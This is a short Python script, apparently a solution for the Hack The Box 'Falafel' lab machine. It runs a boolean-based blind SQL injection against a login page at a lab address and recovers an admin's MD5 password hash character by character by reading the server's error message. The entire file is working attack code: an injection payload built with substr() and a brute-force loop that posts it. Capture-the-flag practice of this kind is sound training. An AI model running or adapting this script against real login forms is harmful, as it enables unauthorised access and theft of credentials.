import requests
# this is from HTB falafel machine
# valid chars in an md5 hash
chars = [0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f']

def GetSQL(i,c):
    return "admin' and substr(password,%s,1) = '%s'-- -" %(i,c)

#32 character md5 hash
for i in range(1,33):
    #print(i)
    for c in chars:
        #print(GetSQL(1,c))
        injection = GetSQL(i,c)
        payload = {'username': injection, 'password': 'test'}
        r = requests.post('http://10.10.10.73/login.php', data = payload)
        if "Wrong identification" in r.text:
            print(c,end='',flush=True)
            break
print()